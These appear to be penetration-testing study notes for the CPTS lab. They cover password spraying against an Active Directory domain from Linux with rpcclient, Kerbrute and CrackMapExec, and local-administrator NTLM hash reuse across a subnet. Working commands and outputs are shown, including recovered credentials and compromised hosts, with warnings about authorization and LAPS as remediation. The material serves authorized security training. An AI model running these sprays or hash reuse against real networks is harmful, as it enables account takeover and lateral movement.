# 🎯 1. Internal Password Spraying — From Linux

> [!info] Objective  
> Once we have a list of valid domain usernames and understand the password policy, we can attempt **one password against many accounts** rather than many passwords against one account.
> 
> This is the fundamental idea of **password spraying**:
> 
> ```text
> ❌ Brute Force
> user1 → Password1
> user1 → Password2
> user1 → Password3
> user1 → Password4
> 
> 🔐 Password Spray
> user1 → Welcome1
> user2 → Welcome1
> user3 → Welcome1
> user4 → Welcome1
> ```
> 
> The goal is to avoid generating enough failed attempts against a single account to trigger the lockout threshold.

---

# ⚡ 2. Command Cheat Sheet

| Goal                             | Command                                                                                                                                                 |
| -------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Password spray with `rpcclient`  | ```<br>for u in $(cat usernames.txt); do rpcclient -U "inlanefreight.local/$u%Welcome1" -c "getusername;quit" 172.16.5.5 \| grep Authority; done<br>``` |
| Password spray with Kerbrute     | `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 usernames.txt Welcome1`                                                                  |
| Password spray with CrackMapExec | `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \| grep +`                                                                          |
| Validate discovered credentials  | `sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123`                                                                                           |
| Local-admin hash spraying        | `sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf \| grep +`                                       |

### 🧰 Tools

- [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html?utm_source=chatgpt.com) — Samba RPC client
    
- [Kerbrute](https://github.com/ropnop/kerbrute?utm_source=chatgpt.com) — Kerberos-based username enumeration and password spraying
    
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec?utm_source=chatgpt.com) — SMB/Windows enumeration and authentication testing
    

---

# 🧠 3. Password Spraying Mental Model

The previous step produced:

```text
👥 Valid usernames
       +
🔐 Password policy
       ↓
🎯 Spray target list
```

Now we perform:

```text
                 ONE PASSWORD
                      │
        ┌─────────────┼─────────────┐
        ↓             ↓             ↓
      user1         user2         user3
        │             │             │
        └─────────────┼─────────────┘
                      ↓
              Authentication
                      │
             ┌────────┴────────┐
             ↓                 ↓
          ❌ Failure          ✅ Success
                               │
                               ↓
                         Validate creds
                               │
                               ↓
                         Further access
```

> [!important] CPTS distinction  
> **Brute forcing** focuses many passwords on one account.  
> **Password spraying** focuses one password across many accounts.
> 
> This distinction matters because AD account lockout policies normally track failed authentication attempts **per account**.

---

# 🐧 4. Internal Password Spraying from Linux

Once `valid_users.txt` has been created, there are several ways to perform the spray from Linux.

The source demonstrates three important options:

1. `rpcclient`
    
2. `Kerbrute`
    
3. `CrackMapExec`
    

The important methodology is:

```text
USER LIST
   ↓
CHOOSE ONE CANDIDATE PASSWORD
   ↓
SPRAY
   ↓
FILTER OUTPUT
   ↓
IDENTIFY SUCCESS
   ↓
VALIDATE CREDENTIALS
```

> [!warning] Authorization & lockout safety  
> Password spraying can lock real accounts. Only perform it against systems/accounts covered by the authorized assessment, and use the client's approved attempt limits and timing. Never assume a particular number of attempts is universally safe.

---

# 🖥️ 5. Password Spraying with rpcclient

`rpcclient` can be used to authenticate against the Domain Controller for every username in a file.

The source notes an important behavior:

> A successful login is not immediately obvious from the normal `rpcclient` response.

Instead, **`Authority Name` indicates a successful authentication**, so we can filter the output with `grep`.

### Command

```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

### 🧠 Breakdown

```text
for u in $(cat valid_users.txt)
        │
        └── Iterate through every username
                    │
                    ↓
rpcclient -U "$u%Welcome1"
        │
        ├── Username = current user
        └── Password = Welcome1
                    │
                    ↓
-c "getusername;quit"
        │
        ├── Ask server for current username
        └── Exit
                    │
                    ↓
grep Authority
        │
        └── Show successful authentication responses
```

The key part is:

```bash
"$u%Welcome1"
```

For each iteration, `$u` is replaced with a username from `valid_users.txt`.

For example:

```text
tjohnson%Welcome1
sgage%Welcome1
avazquez%Welcome1
...
```

---

# ✅ 6. rpcclient Spray Result

Command:

```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

Output:

```text
Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

This tells us that the supplied password successfully authenticated for:

```text
tjohnson : Welcome1
sgage    : Welcome1
```

### 🧠 Why grep `Authority`?

Without filtering, the loop may produce lots of authentication-failure output.

```text
Many attempts
     ↓
Lots of output
     ↓
Hard to manually identify success
     ↓
grep Authority
     ↓
Only interesting successful responses
```

---

# ⚡ 7. Password Spraying with Kerbrute

[Kerbrute](https://github.com/ropnop/kerbrute?utm_source=chatgpt.com) can also perform password spraying.

Command:

```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

### Important arguments

```text
passwordspray
    → Perform password spraying

-d inlanefreight.local
    → Target domain

--dc 172.16.5.5
    → Domain Controller / KDC

valid_users.txt
    → Usernames to test

Welcome1
    → Password to test
```

Example:

```text
2022/02/17 22:57:12 >  Using KDC(s):
2022/02/17 22:57:12 >   172.16.5.5:88

2022/02/17 22:57:12 >  [+] VALID LOGIN:  sgage@inlanefreight.local:Welcome1
2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds
```

### Result

```text
57 accounts tested
      ↓
1 successful login
      ↓
sgage@inlanefreight.local
      +
Welcome1
```

> [!important] Enumeration vs spraying  
> Earlier, `Kerbrute userenum` was used to determine whether usernames existed.
> 
> Here, `kerbrute passwordspray` actually attempts authentication with a password.
> 
> Therefore, **account lockout considerations now apply**.

---

# 🛠️ 8. Password Spraying with CrackMapExec

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec?utm_source=chatgpt.com) accepts a username file with the `-u` option and a single password with `-p`.

```bash
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

### 🧠 Why `grep +`?

CrackMapExec marks successful authentication with:

```text
[+]
```

Therefore:

```text
CrackMapExec output
        ↓
grep +
        ↓
Successful authentication results
```

Example:

```text
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

This gives us:

```text
Username: avazquez
Password: Password123
```

---

# 🔎 9. Validate Discovered Credentials

After obtaining a successful hit, validate the credentials directly against the Domain Controller.

```bash
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

Output:

```text
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

### Why validate?

The spray result gives us a candidate credential.

Validation confirms:

```text
Candidate credential
       ↓
Direct authentication
       ↓
DC accepts it
       ↓
✅ Valid domain credential
```

This removes ambiguity before using the credential for subsequent enumeration.

---

# 🔐 10. Local Administrator Password Reuse

Password spraying is not limited to **domain accounts**.

A similar technique can be used against **local administrator accounts** when we obtain:

- The local administrator's cleartext password, or
    
- The NTLM password hash
    

The idea is:

```text
Host A
  │
  └── Local Administrator password/hash
               │
               ↓
       Try against Host B
       Try against Host C
       Try against Host D
               │
               ↓
       Find password reuse
```

### Why does this happen?

Password reuse is common because organizations may:

- Deploy hosts from **gold images**
    
- Use the same local administrator password for convenience
    
- Prefer centralized/simple deployment processes
    

If the same local administrator password exists across multiple machines, compromising one machine can lead to administrative access on others.

---

# 🎯 11. Target High-Value Hosts

When testing local administrator password reuse, high-value systems are particularly interesting.

Examples:

- SQL servers
    
- Microsoft Exchange servers
    

These systems may be more valuable because they could have:

- Highly privileged users logged in
    
- Administrator credentials persisted in memory
    
- Sensitive data
    
- Additional paths for lateral movement
    

### Mental Model

```text
Compromised workstation
        ↓
Recover local admin credential/hash
        ↓
Test authorized hosts
        ↓
Find password reuse
        ↓
Local admin access
        ↓
Enumerate high-value host
        ↓
Look for additional credentials / access
```

---

# 🔄 12. Password Pattern Reuse

Password reuse is not always an **exact** reuse.

Organizations and users may use predictable variations.

The source gives examples such as:

```text
Desktop:
$desktop%@admin123

Potential server variation:
$server%@admin123
```

Another example:

```text
Local account:
bsmith

Potential domain account:
bsmith
```

And:

```text
Domain user:
ajones

Potential admin account:
ajones_adm
```

The underlying principle is:

> If you recover one credential, examine the organization's naming and password patterns before assuming it is isolated.

### Domain Trust Example

The same concept can apply across domain trusts:

```text
Domain A
ajones : PasswordX
       │
       ↓
Domain B
ajones / similar username
       │
       ↓
Potential password reuse
```

This is especially relevant when multiple trusted domains are present.

---

# 🧬 13. NTLM Hash Reuse

Sometimes we do not recover the cleartext password.

Instead, we recover an NTLM hash from the local **SAM** database.

In that situation, the hash can be tested directly against authorized hosts using an authentication method that accepts the NT hash.

The source demonstrates this with CrackMapExec.

```bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

### Important options

```text
--local-auth
    Only attempt authentication as a local account.

172.16.5.0/23
    Target subnet.

-u administrator
    Local administrator username.

-H <NTLM hash>
    Use the NTLM hash rather than a cleartext password.

grep +
    Show successful authentication results.
```

---

# ⚠️ 14. Why `--local-auth` Is Critical

This is one of the most important details in the entire section.

```bash
--local-auth
```

tells CrackMapExec to attempt authentication as a **local account** on each target.

Without this option, the tool may attempt authentication using the current **domain context**.

That can create a serious problem.

### Without `--local-auth`

```text
Recovered local Administrator hash
             ↓
     CME without local-auth
             ↓
Potential domain authentication
             ↓
Failed attempts against domain accounts
             ↓
⚠️ Account lockout risk
```

### With `--local-auth`

```text
Recovered local Administrator hash
             ↓
       --local-auth
             ↓
Authenticate as local administrator
             ↓
Each target host
             ↓
Find machines reusing the credential
```

> [!important] Source warning  
> **Make sure `--local-auth` is set.** The purpose is to prevent the recovered local administrator credential from being treated as a domain credential and potentially causing domain-account lockouts.

---

# 💻 15. Local Admin Spraying Example

```bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

Output:

```text
SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

The source found the same local administrator credential valid on **three systems**:

```text
172.16.5.50   ACADEMY-EA-MX01
172.16.5.25   ACADEMY-EA-MS01
172.16.5.125  ACADEMY-EA-WEB0
```

`(Pwn3d!)` indicates that the authenticated account has administrative access according to CrackMapExec's SMB checks.

The next step would be to enumerate those systems for information that can further the authorized assessment.

---

# 🔊 16. Why Local Admin Spraying Is Noisy

Local administrator password reuse can be extremely effective, but it is also **noisy**.

```text
One recovered local credential
          ↓
Many hosts
          ↓
Many SMB authentication attempts
          ↓
Network/security logs
          ↓
Potential detection
```

Therefore:

> [!warning] Stealth consideration  
> Local-admin spraying is generally a poor choice for assessments where stealth is explicitly required.

However, even when it is not part of the primary compromise path, checking for local administrator password reuse can be valuable because it is a common security weakness.

---

# 🛡️ 17. Remediation — LAPS

A major defense against local administrator password reuse is Microsoft's **Local Administrator Password Solution (LAPS)**.

[Microsoft LAPS / Local Administrator Password Solution](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview?utm_source=chatgpt.com)

The fundamental idea is:

```text
                 Active Directory
                       │
                       ↓
              Manage local admin
                    passwords
                       │
        ┌──────────────┼──────────────┐
        ↓              ↓              ↓
      Host A          Host B         Host C
        │              │              │
   Unique password Unique password Unique password
        │              │              │
        └──────────────┼──────────────┘
                       ↓
                Rotate periodically
```

Instead of:

```text
Host A → AdminPassword123
Host B → AdminPassword123
Host C → AdminPassword123
```

the goal is:

```text
Host A → Unique password A
Host B → Unique password B
Host C → Unique password C
```

with passwords rotated according to the configured policy.

> [!success] Defensive takeaway  
> LAPS significantly reduces the impact of compromising one local administrator credential because that credential should not automatically provide local-admin access across the rest of the environment.

---

# 🧠 18. Complete Internal Spraying Workflow

```text
                    👥 VALID USERS
                          │
                          ↓
                  🔐 PASSWORD POLICY
                          │
                          ↓
               ⚠️ LOCKOUT PARAMETERS
                          │
                          ↓
                🎯 SELECT CANDIDATE
                    PASSWORD(S)
                          │
             ┌────────────┼────────────┐
             ↓            ↓            ↓
         rpcclient      Kerbrute      CME
             │            │            │
             └────────────┼────────────┘
                          ↓
                    FILTER RESULTS
                          │
                          ↓
                    ✅ VALID HIT
                          │
                          ↓
                 🔎 VALIDATE CREDS
                          │
                          ↓
               🔐 DOMAIN ACCESS
                          │
                          ↓
                ENUMERATE FURTHER
```

### If a local administrator hash is obtained:

```text
           LOCAL ADMIN HASH
                  │
                  ↓
        --local-auth is critical
                  │
                  ↓
        Authorized host range
                  │
                  ↓
          SMB authentication
                  │
         ┌────────┴────────┐
         ↓                 ↓
       FAIL              SUCCESS
                           │
                           ↓
                  Local admin access
                           │
                           ↓
                 Enumerate host
```

---

# 📊 19. Tool Comparison

|Tool|Main Method|Useful For|Success Filtering|
|---|---|---|---|
|`rpcclient`|SMB/RPC|Linux password spraying|`grep Authority`|
|`Kerbrute`|Kerberos|Domain password spraying|`VALID LOGIN`|
|`CrackMapExec`|SMB|Domain spraying + local-admin reuse|`grep +`|
|`CrackMapExec --local-auth`|SMB local authentication|Local admin password/hash reuse|`grep +`|

> [!tip] Choosing the method  
> You do not need to memorize every implementation. Recognize the underlying authentication path:
> 
> **RPC → Kerberos → SMB**
> 
> and choose the method that fits your current access, target, and assessment requirements.

---

# ⚠️ 20. Password Spraying vs Local Admin Reuse

|Technique|Credential|Target|Main Objective|
|---|---|---|---|
|Domain password spraying|One candidate password|Many domain users|Find valid domain credentials|
|Local password reuse|Local admin password|Many hosts|Find hosts reusing the same password|
|Local hash reuse|NTLM hash|Many hosts|Find hosts accepting the same local-admin hash|

### 🧠 Critical distinction

```text
DOMAIN SPRAY
username list
     +
one password
     ↓
many DOMAIN ACCOUNTS


LOCAL ADMIN REUSE
one local admin credential/hash
     ↓
many COMPUTERS
```

---

# 📝 21. CPTS Methodology — What Happens After a Hit?

Finding valid credentials is **not the end of enumeration**.

For a domain-user hit:

```text
Password spray
     ↓
Valid domain credential
     ↓
Validate credential
     ↓
Enumerate domain
     ↓
Identify accessible services
     ↓
Determine privileges
     ↓
Look for lateral movement / privilege escalation
```

For a local-admin reuse hit:

```text
Local admin credential/hash
     ↓
Multiple hosts
     ↓
Identify high-value systems
     ↓
Enumerate each host
     ↓
Search for credentials / sessions / services
     ↓
Continue attack path
```

The important CPTS mindset is:

> **A credential is an access primitive, not the final objective.**

---

# 🎯 22. Key Takeaways

- **Password spraying** tests one password against many accounts.
    
- Always build a valid-user list before spraying when possible.
    
- Understand the **password policy and lockout behavior** before attempting authentication.
    
- `rpcclient` can perform spraying from Linux using a Bash loop.
    
- `Authority Name` can be used to identify successful `rpcclient` authentication responses.
    
- `Kerbrute passwordspray` performs the same general operation through Kerberos.
    
- `CrackMapExec` can spray a username file against a single password.
    
- `grep +` is useful for quickly identifying successful CrackMapExec results.
    
- Always **validate discovered credentials** before relying on them.
    
- Password reuse can occur between:
    
    - Local administrator accounts
        
    - Domain accounts
        
    - Administrator variants
        
    - Accounts across trusted domains
        
- A recovered NTLM hash can reveal **local administrator password reuse** across multiple machines.
    
- Use `--local-auth` when testing a local administrator credential/hash so authentication is treated as local rather than domain-based.
    
- Local administrator password reuse is common and potentially enables rapid lateral movement.
    
- Local-admin spraying is effective but **noisy**.
    
- **LAPS** helps mitigate local administrator password reuse by managing unique, rotating local administrator passwords.
    
- Maintain strict activity logging and follow client-approved lockout/stealth requirements throughout the assessment.